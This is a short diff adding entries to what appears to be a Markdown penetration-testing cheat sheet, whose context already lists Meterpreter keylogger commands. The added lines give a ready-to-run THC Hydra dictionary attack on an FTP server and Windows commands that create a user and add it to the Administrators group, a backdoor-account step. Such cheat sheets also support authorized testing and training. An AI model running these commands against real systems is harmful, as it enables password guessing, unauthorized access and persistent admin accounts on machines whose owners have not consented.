@@ -185,6 +185,21 @@ keyscan_start
 keyscan_dump
 ```
 
+### Attempt to gain access to FTP server perform a dictionaty attack using THC Hydra
+
+```sh
+hydra -L [USERNAMES DICTIONARY] -P [PASSWORDS DICTIONARY] ftp://[IP]
+```
+
+### Create user and set admin privilegies in Windows
+
+```sh
+net user Test /Add
+net localgroup Administrators Test /Add
+```
+
+
+
 [<- Back to index](README.md)
 
 ---
